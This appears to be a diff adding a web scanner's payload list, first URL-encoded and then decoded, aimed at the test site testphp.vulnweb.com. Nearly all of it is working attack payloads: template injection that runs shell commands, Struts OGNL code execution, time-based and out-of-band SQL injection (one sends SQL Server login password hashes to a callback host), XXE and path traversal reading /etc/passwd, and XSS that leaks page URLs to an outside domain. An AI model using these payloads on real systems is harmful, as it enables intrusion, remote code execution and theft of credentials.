+    322 %24%7b__import__(%27os%27).popen(__import__(%27base64%27).urlsafe_b64decode(%27bnNsb29rdXAgenF2aWw0LXB0N3hhdmZzamlhNWhvMTZrd3pxaHhmcW90emYweXVlcm10dy5yODcubWU%3d%27)).read()%7d 
+    323 %7b%7b__import__(%27os%27).popen(__import__(%27base64%27).urlsafe_b64decode(%27bnNsb29rdXAgenF2aWw0LXB0N3J2dGljYWZidXN6bzVjenp2ODQ3ZW10ZWtlY2xqNzB6bS5yODcubWU%3d%27)).read()%7d%7d 
+    324 %7b%25%20set%20d%20%3d%20%22eval(__import__(%27base64%27).urlsafe_b64decode(%27X19pbXBvcnRfXygnb3MnKS5wb3BlbihfX2ltcG9ydF9fKCdiYXNlNjQnKS51cmxzYWZlX2I2NGRlY29kZSgnYm5Oc2IyOXJkWEFnZW5GMmFXdzBMWEIwTnkxa1kzTnNlWGh0WVhRemJtSm5aR2Q1ZDNRNVozSnFkMmMxWW5aNk5XeHRaeTV5T0RjdWJXVT0nKSkucmVhZCgp%27))%22%20%25%7d%7b%25%20for%20c%20in%20%5b%5d.__class__.__base__.__subclasses__()%20%25%7d%20%7b%25%20if%20c.__name__%20%3d%3d%20%27catch_warnings%27%20%25%7d%7b%25%20for%20b%20in%20c.__init__.func_globals.values()%20%25%7d%20%7b%25%20if%20b.__class__%20%3d%3d%20%7b%7d.__class__%20%25%7d%7b%25%20if%20%27eval%27%20in%20b.keys()%20%25%7d%7b%7b%20b%5b%27eval%27%5d(d)%20%7d%7d%7b%25%20endif%20%25%7d%7b%25%20endif%20%25%7d%7b%25%20endfor%20%25%7d%7b%25%20endif%20%25%7d%7b%25%20endfor%20%25%7d 
+    325 %24%7bglobal.process.mainModule.require(%27child_process%27).execSync(Buffer(%27bnNsb29rdXAgenF2aWw0LXB0N3ZxNm1rMHl0eGE1cm9obGQ4dTBuZHhvYV9pemJqal9nMC5yODcubWU%3d%27%2c%27base64%27).toString())%7d 
+    326 %7b%7b%3d%20global.process.mainModule.require(%27child_process%27).execSync(Buffer(%27bnNsb29rdXAgenF2aWw0LXB0N2h5eThhejV5NGR0bmIxMm1iN2ZjenIzZmRreHJ0c2owNC5yODcubWU%3d%27%2c%27base64%27).toString())%7d%7d 
+    327 %7b%7brange.constructor(%22return%20global.process.mainModule.require(%27child_process%27).execSync(%27nslookup%20zqvil4-pt7mo4zfmm8of2yjluef-z30wotreump5%22%20%2b%20%22n08.ABCtor.com%27)%22)()%7d%7d 
+    328 %3d%20global.process.mainModule.require(%27child_process%27).execSync(Buffer(%27bnNsb29rdXAgenF2aWw0LXB0N2t2bGwxcm55YXpobmw1c3o4cGNsX19nMC1wOGR0Z29mby5yODcubWU%3d%27%2c%27base64%27).toString()) 
+    329 %3c%25-%20global.process.mainModule.require(%27child_process%27).execSync(Buffer(%27bnNsb29rdXAgenF2aWw0LXB0N3pfZmloYXY3M2dld3Jmdmt1LXlyb2xjdTVteXZ5eXB0NC5yODcubWU%3d%27%2c%27base64%27).toString())%20%25%3e 
+    330 %7bphp%7dSmarty_Resource%3a%3aparseResourceName(system(%22nslookup%20zqvil4-pt7oyjkjdvxspn-d007p6y_jlv-f8vfyu%22.%22z88.ABCtor.com%22)%2c%27b%27)%3b%7b%2fphp%7d 
+    331 %7B%7B_self.env.registerUndefinedFilterCallback(%22system%22)%7D%7D%7B%7B_self.env.getFilter(%22nslookup%20zqvil4-pt7ebfra1zaryisrpm0cej7huxthiomxz%22~%22bb4.ABCtor.com%22)%7D%7D 
+    332 %3c%25%3d%20%22%23%7b(require%27base64%27%3b%25x(%23%7bBase64.urlsafe_decode64(%27bnNsb29rdXAgenF2aWw0LXB0N2RkMngwdGw2YnJjMnJmZy13Y3hicXV6ODlmcm9kZW16cS5yODcubWU%3d%27)%7d)).to_s%7d%22%20%25%3e 
+    333 %3c%23assign%20ex%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%24%7b%20ex(%22bash%20-c%20%7beval%2c%24(%7btr%2c%2f%2b%2c_-%7d%3c%3c%3cbnNsb29rdXAgenF2aWw0LXB0N2FubWxmaGdweDNpYWhoMHN3bWpyaDB3aXFnZW1zNXMtNC5yODcubWU%3d%7c%7bbase64%2c--decode%7d)%7d%22)%20%7d 
+    334 %3c%23assign%20ex%3d%22freemarker.template.utility.Execute%22%3fnew()%3e%24%7b%20ex(%22cmd.exe%20%2fc%20nslookup%20zqvil4-pt7941khot31ucrlb65zkxyzsfaxypx4_%22%2b%22f9k.ABCtor.com%22)%20%7d 
+    335 %23set(%24engine%3d%22%22)%0a%23set(%24proc%3d%24engine.getClass().forName(%22java.lang.Runtime%22).getRuntime().exec(%22bash%20-c%20%7beval%2c%24(%7btr%2c%2f%2b%2c_-%7d%3c%3c%3cbnNsb29rdXAgenF2aWw0LXB0N2t6cG5nc2J1ZnZhODlqbWNzNXAzazdzY2J5YnMxdm02YS5yODcubWU%3d%7c%7bbase64%2c--decode%7d)%7d%22))%0a%23set(%24null%3d%24proc.waitFor())%0a%23set(%24istr%3d%24proc.getInputStream())%0a%23set(%24chr%3d%24engine.getClass().forName(%22java.lang.Character%22))%0a%23set(%24output%3d%22%22)%0a%23set(%24string%3d%24engine.getClass().forName(%22java.lang.String%22))%0a%23foreach(%24i%20in%20%5b1..%24istr.available()%5d)%0a%23set(%24output%3d%24output.concat(%24string.valueOf(%24chr.toChars(%24istr.read()))))%0a%23end%0a%24%7boutput%7d 
+    336 %23set(%24engine%3d%22%22)%0a%23set(%24cmd%3d%22cmd.exe%20%2fc%20nslookup%20zqvil4-pt7gupkzwcmbmfcsibruxkti0tzgjp2ha%22%2b%22d2c.ABCtor.com%22)%23set(%24proc%3d%24engine.getClass().forName(%22java.lang.Runtime%22).getRuntime().exec(%24cmd))%0a%23set(%24null%3d%24proc.waitFor())%0a%23set(%24istr%3d%24proc.getInputStream())%0a%23set(%24chr%3d%24engine.getClass().forName(%22java.lang.Character%22))%0a%23set(%24output%3d%22%22)%0a%23set(%24string%3d%24engine.getClass().forName(%22java.lang.String%22))%0a%23foreach(%24i%20in%20%5b1..%24istr.available()%5d)%0a%23set(%24output%3d%24output.concat(%24string.valueOf(%24chr.toChars(%24istr.read()))))%0a%23end%0a%24%7boutput%7d 
+    337 -1%20AND%20((SELECT%201%20FROM%20(SELECT%202)a%20WHERE%201%3dsleep(25)))--%201 
+    338 ((select%20sleep(25)))a--%201 
+    339 (select%20dbms_pipe.receive_message((chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%2c25)%20from%20dual) 
+    340 1%27%20%7c%7c%20(select%20dbms_pipe.receive_message((chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%2c25)%20from%20dual)%20%7c%7c%20%27 
+    341 1%20%2b%20(select%20dbms_pipe.receive_message((chr(95)%7c%7cchr(33)%7c%7cchr(64)%7c%7cchr(51)%7c%7cchr(100)%7c%7cchr(105)%7c%7cchr(108)%7c%7cchr(101)%7c%7cchr(109)%7c%7cchr(109)%7c%7cchr(97))%2c25)%20from%20dual)%20%2b%201 
+    342 query%27%3bSELECT%20pg_sleep(25)-- 
+    343 query%3bSELECT%20pg_sleep(25)-- 
+    344 SELECT%20pg_sleep(25)-- 
+    345 query)%3bSELECT%20pg_sleep(25)-- 
+    346 query%27)%3bSELECT%20pg_sleep(25)-- 
+    347 query%27))%3bSELECT%20pg_sleep(25)-- 
+    348 query))%3bSELECT%20pg_sleep(25)-- 
+    349 ((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) 
+    350 %27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 
+    351 %27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(1))A))%2b%27 
+    352 %27%2b((SELECT%201%20FROM%20(SELECT%20SLEEP(30))A))%2b%27 
+    353 -1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%27 
+    354 -1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(1))A))%2b%27 
+    355 -1%27%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(30))A))%2b%27 
+    356 -1%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A)) 
+    357 -1%22%20or%201%3d((SELECT%201%20FROM%20(SELECT%20SLEEP(25))A))%2b%22 
+    358 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(6))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(6))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(6))A)))OR%22*%2f 
+    359 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(14))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(14))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(14))A)))OR%22*%2f 
+    360 query%20%2b%20((SELECT%201%20FROM%20(SELECT%20SLEEP(22))A))%2f*%27XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(22))A)))OR%27%7c%22XOR(((SELECT%201%20FROM%20(SELECT%20SLEEP(22))A)))OR%22*%2f 
+
+
+
+Payloads URL-Decoded:
+    1 query 
+    2 %27 
+    3 -1 OR 1=1 
+    4 ' WAITFOR DELAY '0:0:25'-- 
+    5 ABCtor222222 
+    6 "& SET /A 0xFFF9999-40388 & 
+    7 "& ping -n 25 127.0.0.1 & 
+    8 nxtspxrkex 
+    9 /../../../../../../../../../../boot.ini 
+    10 hTTp://ABCtor.com/n 
+    11 response.write(268409241-24189)' 
+    12 {{268409241-24189}} 
+    13 
+    ns:ABCtor056650=vuln 
+    14 http://ABCtor.com/?testphp.vulnweb.com/ 
+    15 (select convert(int,cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) 
+    16 1 WAITFOR DELAY '0:0:25'-- 
+    17 '& SET /A 0xFFF9999-43096 & 
+    18 '& ping -n 25 127.0.0.1 & 
+    19 ABCtor222222 
+    20 "||ABCtor|| 
+    21 ABCtor 
+    22 <?xml version="1.0"?><!DOCTYPE ns [<!ELEMENT ns ANY><!ENTITY lfi SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">]><ns>&lfi;</ns> 
+    23 '"--></style></scRipt><scRipt>ABCtor(0x000003)</scRipt> 
+    24 '+ (select convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) from syscolumns) +' 
+    25 /../../../../../../../../../../boot.ini..php 
+    26 +response.write(268409241-82823)' 
+    27 %27%22--%3E%3C%2Fstyle%3E%3C%2FscRipt%3E%3CscRipt%3EABCtor%280x000005%29%3C%2FscRipt%3E 
+    28 query/../../../../../../../../../../boot.ini 
+    29 WAITFOR DELAY '0:0:25'-- 
+    30 & ping -n 25 127.0.0.1 & 
+    31 http://ABCtor.com/n?..php 
+    32 ${268409241-82823} 
+    33 http://example.com/?
+    ns: ABCtor056650=vuln 
+    34 1) WAITFOR DELAY '0:0:25'-- 
+    35 http://ABCtor.com/n?.php 
+    36 =268409241-89362 
+    37 ns:ABCtor056650=vuln 
+    38 ping -n 25 127.0.0.1 & 
+    39 ' 
+    40 ') WAITFOR DELAY '0:0:25'-- 
+    41 {{=268409241-43359}} 
+    42 
+    ns:ABCtor056650=vuln 
+    43 "&ping -w 25 127.0.0.1 &" 
+    44 NSqueryNO 
+    45 ')) WAITFOR DELAY '0:0:25'-- 
+    46 data:;base64,JyI+PHNjcmlwdD5uZXRzcGFya2VyKDB4MDAwMDA2KTwvc2NyaXB0Pg== 
+    47 file:///boot.ini 
+    48 <%- 268409241-21992 %> 
+    49 "+response.write(268409241-89362)+" 
+    50 '&ping -w 25 127.0.0.1 &' 
+    51 <% response.write(268409241-43359) %> 
+    52 #set($c=268409241 - 63879)
+    ${c} 
+    53 c:\boot.ini 
+    54 '" ns=ABCtor(0x000007)  
+    55 1)) WAITFOR DELAY '0:0:25'-- 
+    56 <#assign x=268409241 - 87951>
+    ${x?string["0"]} 
+    57 ns../../../../../../../../../../../boot.ini....................................................................................................................................................................................... 
+    58 1 ns=ABCtor(0x000008)  
+    59 1));DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x-- 
+    60 <%= "#{268409241-8993}" %> 
+    61 %2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fboot.ini 
+    62 ${28275*28275-(24189)} 
+    63 & SET /A 0xFFF9999-41364 & 
+    64 <?xml version="1.0"?><!DOCTYPE ns [<!ELEMENT ns ANY><!ENTITY lfi SYSTEM "file:///etc/passwd">]><ns>&lfi;</ns> 
+    65 convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000))) 
+    66 php://filter//resource=http://ABCtor.com/n?..php 
+    67 1;DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x-- 
+    68 //ABCtor.com/n/n.css?0x00000D 
+    69 file%3a%2f%2f%2fboot.ini 
+    70 SET /A 0xFFF9999-23396 & 
+    71 #{28275*28275-(82823)} 
+    72 query AND 'NS='ss 
+    73 &ping -w 25 127.0.0.1 & 
+    74 c%3a%5cboot.ini 
+    75 SET /A 0xFFF9999-44536 
+    76 query' OR 1=1 OR 'ns'='ns 
+    77 ping -w 25 127.0.0.1 & 
+    78 print(int)0xFFF9999-31823 
+    79 print(int)0xFFF9999-7677; 
+    80 query" OR 1=1 OR "ns"="ns 
+    81 +print(int)0xFFF9999-83144;// 
+    82 -1 OR 17-7=10 
+    83 '+print(int)0xFFF9999-79493+' 
+    84 "+print(int)0xFFF9999-40087+" 
+    85 <?=(int)0xFFF9999-95429;//?> 
+    86 //ABCtor.com/n/j/?0x00000E 
+    87 1);DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x-- 
+    88 ABCtor.com/n 
+    89 'AND 1=cast(0x5f21403264696c656d6d61 as varchar(8000)) or '1'=' 
+    90 {php}print(int)0xFFF9999-82068;{/php} 
+    91 syscolumns WHERE 2>3;DECLARE/**/@x/**/char(9);SET/**/@x=char(48)+char(58)+char(48)+char(58)+char(50)+char(53);WAITFOR/**/DELAY/**/@x-- 
+    92 /../../../../../../../../../../web.config 
+    93 query OR X='ss 
+    94 | SET /A 0xFFF9999-53141 
+    95 ping -n 25 127.0.0.1 
+    96 NS09＜s1﹥DBLʺSNGLʹNS09 
+    97 '{${print(int)0xFFF9999-19200}}' 
+    98 -1 or 1=1 and (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a) 
+    99 query + ((SELECT 1 FROM (SELECT SLEEP(25))A))/*'XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR'|"XOR(((SELECT 1 FROM (SELECT SLEEP(25))A)))OR"*/ 
+    100 /../../../../../../../../../../windows/win.ini 
+    101 -1' and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+' 
+    102 http://testphp.vulnweb.com/trace.axd 
+    103 [php]print(int)0xFFF9999-18973;[/php] 
+    104 ping -w 25 127.0.0.1 
+    105 query";expr 268409241 - 9132;" 
+    106 query' OR 1=1 OR '1'='1 
+    107 %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='43487').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c','SET /A 0xFFF9999 -' + #cmd}:{'/bin/bash','-c','expr 268409241 - ' + #cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} 
+    108 query';expr 268409241 - 9223;' 
+    109 print localtime()*0+0xFFF9999-32019 
+    110 eval('print localtime()*0+0xFFF9999-16227') 
+    111 query;expr 268409241 - 15850;x 
+    112 file:///windows/win.ini 
+    113 http://ABCtor.com/?testphp.vulnweb.com/ 
+    114 query" OR 1=1 OR "1"="1 
+    115 /../../../../../../../../../../windows/win.ini..php 
+    116 expr 268409241 - 32610; 
+    117 '><net ABCtor=ABCtor(0x00000F)> 
+    118 zqvil4-pt7xgjwbvqthswqre8a3m5z1tlrbk4whnolu.ABCtor.com 
+    119 exec('xp_dirtree ''\\zqvil4-pt719obr30tywf2cvwbpgnkqyqgvjslqj'+'8fy.ABCtor.com'+'\c$\a''') 
+    120 https://ABCtor.com/?testphp.vulnweb.com/ 
+    121 -1" and 6=3 or 1=1+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+" 
+    122 c:\windows\win.ini 
+    123 (SELECT CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97))) 
+    124 ...//...//...//...//...//...//...//...//...//...//...//windows/win.ini 
+    125 //zqvil4-pt7o5qxrfwqj107ow-3jrn-9mfg9enhjyzoq.ABCtor.com 
+    126 cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric) 
+    127 ....//....//....//....//....//....//....//....//....//....//....//windows/win.ini 
+    128 |ping -n 25 127.0.0.1 
+    129 testphp.vulnweb.com/trace.axd 
+    130 '+print localtime()*0+0xFFF9999-37224+' 
+    131 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "http://zqvil4-p"><!ENTITY % d "t7mivtrkfi1vbsgoit_xrwnkzvktljszml4.ABCtor.com"><!ENTITY % dtd SYSTEM "http://ABCtor.com/dtd">  %dtd;]><r>&a;</r> 
+    132 '||cast((select chr(95)||chr(33)||chr(64)||chr(53)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97)) as numeric)||' 
+    133 .....///.....///.....///.....///.....///.....///.....///.....///.....///.....///.....///windows/win.ini 
+    134 . . /. . /. . /. . /. . /. . /. . /. . /. . /. . /. . /windows/win.ini 
+    135 "+print localtime()*0+0xFFF9999-18824+" 
+    136 176.28.50.165/trace.axd 
+    137 expr 268409241 - 81787 
+    138 //ABCtor.com/?http://testphp.vulnweb.com/ 
+    139 declare @h varchar(999)select @h='1'+substring(name+'-'+master.sys.fn_varbintohexstr(ISNULL(password_hash,0x0)),0,63)+'.zqvil4-pt7qxpcuiqfwqiuqesq6tofudy0-avzu_'+'lvm.ABCtor.com' from sys.sql_logins WHERE principal_id=1;exec('xp_dirtree ''\\'+@h+'\c$''') 
+    140 "><net ABCtor=ABCtor(0x000010)> 
+    141 127.100.11.2/trace.axd 
+    142 <!--#exec cmd="expr 268409241 - 87740"--> 
+    143 ABCtor.com/?testphp.vulnweb.com/ 
+    144 ::1/trace.axd 
+    145 <iMg src=N onerror=ABCtor(0x000011)> 
+    146 ABCtor.com/?http://testphp.vulnweb.com/ 
+    147 arguments[1].end(require('child_process').execSync('expr 268409241 - 50768')) 
+    148 http://ABCtor.com/r/?id=zqvil4-pt7s5u56f8eac6w-aue9wv4zgpkhej1c-500 
+    149 /../../../../../../../../../../windows/iis6.log 
+    150 (select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL) 
+    151 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "php://filter/resource=http://zqvil4-p"><!ENTITY % d "t7dcttkmxav9cteshculox3gjria8xa_oxc.ABCtor.com"><!ENTITY % dtd SYSTEM "http://ABCtor.com/dtd">  %dtd;]><r>&a;</r> 
+    152 '"--></style></scRipt><scRipt src="//zqvil4-pt7pflq5hcmnmmpoydq4lsvclrncoebrw_vo&#46;ABCtor&#46;me"></scRipt> 
+    153 /../../../../../../../../../../proc/self/fd/2 
+    154 NSFTW 
+    155 1;exec('xp_dirtree ''\\zqvil4-pt73prxftj3e-pvlv4ahhee1vnlnu9hx1'+'wxa.ABCtor.com'+'\c$\a''')-- 
+    156 /../../../../../../../../../../proc/self/fd/2..php 
+    157 -1';exec('xp_dirtree ''\\zqvil4-pt7majuxr7xh_ggbwnvj2iguyinpzy0gm'+'hzw.ABCtor.com'+'\c$\a''')-- 
+    158 '+NSFTW+' 
+    159 javascript:ABCtor(0x000012) 
+    160 /../../../../../../../../../../etc/httpd/logs/error.log 
+    161 ABCtor.com/?https://testphp.vulnweb.com/ 
+    162 (SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a) 
+    163 /../../../../../../../../../../etc/httpd/logs/error_log 
+    164 /\ABCtor.com/?testphp.vulnweb.com/ 
+    165 <scRipt>ns(0x000013)</scRipt> 
+    166 /../../../../../../../../../../var/log/apache2/error.log 
+    167 <%a style=x:expre/**/ssion(ABCtor(0x000014))> 
+    168 ///ABCtor.com/?testphp.vulnweb.com/ 
+    169 <iMg src="//zqvil4-pt7uy3lf8kczphitsh4akkigx74cvfh3a8sg&#46;ABCtor&#46;me"/> 
+    170 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE r [<!ENTITY % s "php://filter/read=convert.base64-encode/resource=http://zqvil4-p"><!ENTITY % d "t77m0wdtqeaqbuqmrzwbj1joq4givq9sjiq.ABCtor.com"><!ENTITY % dtd SYSTEM "http://ABCtor.com/dtd">  %dtd;]><r>&a;</r> 
+    171 127.0.0.1/trace.axd 
+    172 http://zqvil4-pt7xllvkm_uygkoyciek1d2c7s5ikw0nqc_b.ABCtor.com/p/ 
+    173 |expr${IFS}268409241${IFS}-${IFS}75678 
+    174 /../../../../../../../../../../var/log/apache/error.log 
+    175 <iframe src="http://ABCtor.com/?"></iframe> 
+    176 n;ns:expression(ABCtor(0x000015)); 
+    177 http://testphp.vulnweb.com/elmah.axd 
+    178 1) exec('xp_dirtree ''\\zqvil4-pt7yl5r6xbzlifzt1n4qfa6roglk_kkmm'+'37y.ABCtor.com'+'\c$\a''')-- 
+    179 arguments[1].end(require('child_process').execSync('set /A 268409241 - 61062')) 
+    180 /../../../../../../../../../../proc/version 
+    181 testphp.vulnweb.com.ABCtor.com/? 
+    182 body{x:expression(ABCtor(0x000016))} 
+    183 */ABCtor(0x000017);/* 
+    184 1')exec('xp_dirtree ''\\zqvil4-pt755tkz6cgbwra6hr-pq6elbuvgx9k7h'+'eka.ABCtor.com'+'\c$\a''')-- 
+    185 http://testphp.vulnweb.com.ABCtor.com/? 
+    186 -1'+(SELECT 1 and ROW(1,1)>(SELECT COUNT(*),CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97),0x3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.COLLATIONS GROUP BY x)a)+' 
+    187 gethostbyname(trim('zqvil4-pt7ozyecxcyptahh9lrbems_ate3pwnlt'.'h4c.ABCtor.com')) 
+    188 '+ABCtor(0x000018)+' 
+    189 <fRame src="//zqvil4-pt74hbj8p9fh7dw7ptu2sd0hdtwehu-tcs28&#46;ABCtor&#46;me"></fRame> 
+    190 https://testphp.vulnweb.com.ABCtor.com/? 
+    191 <scRipt src="data:;base64,bD1kb2N1bWVudC5jcmVhdGVFbGVtZW50KCJsaW5rIik7bC5yZWw9InByZWZldGNoIjtsLmhyZWY9Ii8venF2aWw0LXB0N3lsbXR1bG1ldHgzczdsZ3lhdXF0dHp4cWg3Ymx1diIrIl9xaS5yODcubWUvci8/Iitsb2NhdGlvbi5ocmVmO2RvY3VtZW50LmhlYWQuYXBwZW5kQ2hpbGQobCk="></scRipt> 
+    192 testphp.vulnweb.com/elmah.axd 
+    193 /../../../../../../../../../../proc/version..php 
+    194 %{#context["com.opensymphony.xwork2.dispatcher.HttpServletResponse"].addHeader("a",268409241-25519)} 
+    195 /../../../../../../../../../../../etc/passwd 
+    196 176.28.50.165/elmah.axd 
+    197 127.100.11.2/elmah.axd 
+    198 file:///etc/passwd 
+    199 000177.000.00000.000001/trace.axd 
+    200 ::1/elmah.axd 
+    201 /../../../../../../../../../../../etc/passwd. 
+    202 0177.0.0.1/trace.axd 
+    203 127.0.0.1/elmah.axd 
+    204 0177.0.1/trace.axd 
+    205 0177.1/trace.axd 
+    206 http://testphp.vulnweb.com/elmah 
+    207 "+ABCtor(0x000019)+" 
+    208 ";l=document.createElement("link");l.rel="prefetch";l.href="//zqvil4-pt7j2rsjp1kfjzgzucivsvgm2kun3eibd"+"lyg.ABCtor.com/r/?"+location.href;document.head.appendChild(l);// 
+    209 017700000001/trace.axd 
+    210 php://filter//resource=http://zqvil4-pt79503q5mxp_sdto2jqlepudrpiivbxuajl.ABCtor.com/p/ 
+    211 testphp.vulnweb.com/elmah 
+    212 zqvil4-pt7eljdwmquhdjplheb5qadgag5p884eqcvr.ABCtor.com/p/ 
+    213 ';l=document.createElement("link");l.rel="prefetch";l.href="//zqvil4-pt739tcravn61eqdoy3towcx_wu9dos4w"+"83c.ABCtor.com/r/?"+location.href;document.head.appendChild(l);// 
+    214 0x7f.0.0.1/trace.axd 
+    215 \';ABCtor(0x00001A);/// 
+    216 1))exec('xp_dirtree ''\\zqvil4-pt7wrksd5nlafyo2hee13vnnuzsy_tg9c'+'3bk.ABCtor.com'+'\c$\a''')-- 
+    217 /../../../../../../../../../../../etc/passwd..php 
+    218 -1\'+(select 1 and row(1,1)>(select count(*),concat(CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)),0x3a,floor(rand()*2))x from (select 1 union select 2)a group by x limit 1))-- 1 
+    219 0x7f.0.1/trace.axd 
+    220 176.28.50.165/elmah 
+    221 1 procedure analyse(extractvalue(rand(),concat(0x3a,CONCAT(CHAR(95),CHAR(33),CHAR(64),CHAR(52),CHAR(100),CHAR(105),CHAR(108),CHAR(101),CHAR(109),CHAR(109),CHAR(97)))),1)-- 1 
+    222 0x7f.1/trace.axd 
+    223 127.100.11.2/elmah 
+    224 gethostbyname(trim('zqvil4-pt7b0frqnntz_pre9r4ffvx5dnxjogbo-'.'n_c.ABCtor.com')); 
+    225 ::1/elmah 
+    226 127.0.0.1/elmah 
+    227 ...//...//...//...//...//...//...//...//...//...//...//etc/passwd 
+    228 1'))exec('xp_dirtree ''\\zqvil4-pt7xlb91j_onbn6jafmfozkdj2ch52r1m'+'npk.ABCtor.com'+'\c$\a''')-- 
+    229 http://aws.ABCtor.com/latest/meta-data/public-hostname 
+    230 ....//....//....//....//....//....//....//....//....//....//....//etc/passwd 
+    231 (length(CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL)))) 
+    232 +gethostbyname(trim('zqvil4-pt76dlsae-rvc_egc8msmqx6zwngwoans'.'l2w.ABCtor.com'));// 
+    233 &#39;,ABCtor(0x00001D),&#39; 
+    234 0x7f000001/trace.axd 
+    235 '||CTXSYS.DRITHSX.SN(user,(select chr(95)||chr(33)||chr(64)||chr(51)||chr(100)||chr(105)||chr(108)||chr(101)||chr(109)||chr(109)||chr(97) from DUAL))||' 
+    236 '+gethostbyname(trim('zqvil4-pt7vkz0d2v_bbw2ycqk67ycwpvcv_fgv8'.'cgo.ABCtor.com'))+' 
+    237 '+convert(int, cast(0x5f21403264696c656d6d61 as varchar(8000)))+' 
+    238 127.0.1/trace.axd 
+    239 127.1/trace.axd 
